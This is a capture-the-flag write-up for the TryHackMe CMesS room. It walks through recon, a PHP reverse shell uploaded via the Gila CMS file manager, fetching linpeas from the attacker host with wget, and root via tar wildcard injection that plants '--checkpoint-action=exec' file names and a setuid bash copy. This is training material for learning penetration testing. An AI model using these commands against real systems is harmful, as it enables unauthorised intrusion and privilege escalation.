# TryHackMe CMesS

- [Room](https://tryhackme.com/room/cmess)

## Nmap

```bash
┌──(root💀kali)-[~]
└─# nmap -T4 -sC -sV -O -Pn -p- 10.10.125.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 12:09 EDT
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.20% done
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.26% done
Nmap scan report for cmess.thm (10.10.125.143)
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.16 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (92%), Linux 3.0 - 3.2 (92%), Linux 3.0 - 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1289.07 seconds
```

## Port 80

![image](https://user-images.githubusercontent.com/96747355/176236230-0ba5c004-d17a-4a12-a78e-0ac29620f9ca.png)    
- When googling we find [this](https://www.cvedetails.com/cve/CVE-2020-5514/) (needs to be authenticated)  
- We have a robots.txt  
![image](https://user-images.githubusercontent.com/96747355/176236371-39a429f6-3054-44b6-af45-396859476a4b.png)  
- With gobuster we found: /login and /admin
- Let's look for subdomain `wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm" --hw 290` 
- We remove pages with 290 words because it is a not found response so not relevant for us even though the response code is 200. W find dev subdomain let's add it to /etc/hosts `10.10.125.143 dev.cmess.thm`
- We find a few usernames and a username password combination! Let's try it!
![image](https://user-images.githubusercontent.com/96747355/176244503-a9fe3480-a4e1-4b7d-b3d0-8429c7099b10.png)  
- And it works!  
![image](https://user-images.githubusercontent.com/96747355/176245591-17c1872a-77f9-424d-812e-df694ba131b9.png)  
- In the dashboard there is a feature called file manager. If we check out the config file we find a few interesting info including another password that we keep aside for later.  
![image](https://user-images.githubusercontent.com/96747355/176247384-c2effae3-bac8-4dd5-ba47-31c7517ac477.png)  
- We can try the CVE previously found with google 
- let's follow this blog [post](https://infosecdb.wordpress.com/2020/01/05/gilacms-1-11-8-remote-code-execution/)
  - => NOT WORKING
- What's working though is to use the feature to download a php reverse shell this way we get a shell. Our file goes in the asset folder  
![image](https://user-images.githubusercontent.com/96747355/176249759-aed47f3b-5cc1-4e3b-a6fd-cf55e9b88176.png)  
- Then we just need to access to the url `http://cmess.thm/assets/php-reverse-shell.php` and we get our shell  
![image](https://user-images.githubusercontent.com/96747355/176250190-a5a5c620-0ec1-45cf-8574-327d18be0275.png)  
- We stabilize our shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Lets get a privesc enum script in our target. I am a fan of linpeas so I am gonna use it here.
  - `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
  - `python3 -m http.server 80`
  - And from our target we type `wget http://10.13.22.56/linpeas.sh` (we need to be in the tmp folder to successfully write the file)
  - We make it executable `chmod +x linpeas.sh` and we launch it `./linpeas.sh`

## Lateral movement

## Interesting output from linpeas  

- [Kernel exploits](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits)  
![image](https://user-images.githubusercontent.com/96747355/176254540-808b1e35-3040-47c3-b075-2f6e1b0c6fb9.png)  

- [Sudo version](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
![image](https://user-images.githubusercontent.com/96747355/176254372-dc5e27df-f5c4-4f5b-a076-75771f4b478c.png)  

- List of cve we could try out
```
[+] [CVE-2017-16995] eBPF_verifier
[+] [CVE-2016-5195] dirtycow
[+] [CVE-2016-5195] dirtycow 2
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
[+] [CVE-2017-7308] af_packet
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
[+] [CVE-2017-6074] dccp
[+] [CVE-2017-1000112] NETIF_F_UFO
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
[+] [CVE-2016-8655] chocobo_root
[+] [CVE-2016-4557] double-fdput()
[+] [CVE-2021-3156] sudo Baron Samedit
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
[+] [CVE-2019-18634] sudo pwfeedback
   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
[+] [CVE-2019-15666] XFRM_UAF
[+] [CVE-2018-1000001] RationalLove
[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64
[+] [CVE-2017-1000253] PIE_stack_corruption
[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE
   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
[+] [CVE-2016-2384] usb-midi
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
[+] [CVE-2016-0728] keyring
      CVE-2016-8655
      CVE-2018-14665
      CVE-2017-16695
```
- other interesting things to check
```
/etc/cron.d:
-rw-r--r--  1 root root  191 Feb  6  2020 popularity-contest
*/2 *   * * *   root    cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -  
-rw------- 1 root root 317 Feb  6  2020 /etc/mysql/debian.cnf
drwxr-xr-x 2 root root 4096 Feb  6  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Feb  6  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
/usr/share/doc/openssh-client/examples/sshd_config 
/opt/.password.bak
```
- The sudo version is not successful cause our version does not seem vulnerable.
- Let's check this file `/opt/.password.bak`  
![image](https://user-images.githubusercontent.com/96747355/176259230-96bf43f5-7bd2-4b84-b7f8-50b34028b1d9.png)  
- We have another password
- Let's try it if we su andre it works! let's ssh as andre
![image](https://user-images.githubusercontent.com/96747355/176259522-58a59463-1c0c-474e-b8d7-b082ec8e0329.png)  
- Let's grab the user flag  
![image](https://user-images.githubusercontent.com/96747355/176260214-7478952b-3cac-45e3-851f-db27f15fd50a.png)  

- Let's now enumerate way to privesc from Andre's user

## Privesc

### Linepeas as Andre

- Our home is in the path. [Ressources for this on hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses)
![image](https://user-images.githubusercontent.com/96747355/176260810-dfe4817a-5460-4895-b054-70cef795512b.png)
This seems to be an interesting cron job  
![image](https://user-images.githubusercontent.com/96747355/176261237-b9c710fc-e755-4164-b59f-d305cbb5d246.png)  
- This is doing a backup with a wildcard. We can try to abuse this.
- Let's go to the backup folder
- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh` we create a malicious bash
- `touch /home/andre/backup/--checkpoint=1` when the scheduled script is going to read the home directory it will have a file named as a tar command, so it will interpret it. This command displays a status message every 1
- `touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh` then this command is going to make and action when the checkpoint we created before is hit
- Let's now try to launch our script `/tmp/bash -p`  
- It works!  
![image](https://user-images.githubusercontent.com/96747355/176267325-6ea9c1b2-b09f-4688-8fdf-4c84b470ad62.png)  
- Let's grab the last flag  
![image](https://user-images.githubusercontent.com/96747355/176267587-82e56ca1-047e-410c-a5c5-b2a11e87d342.png)  

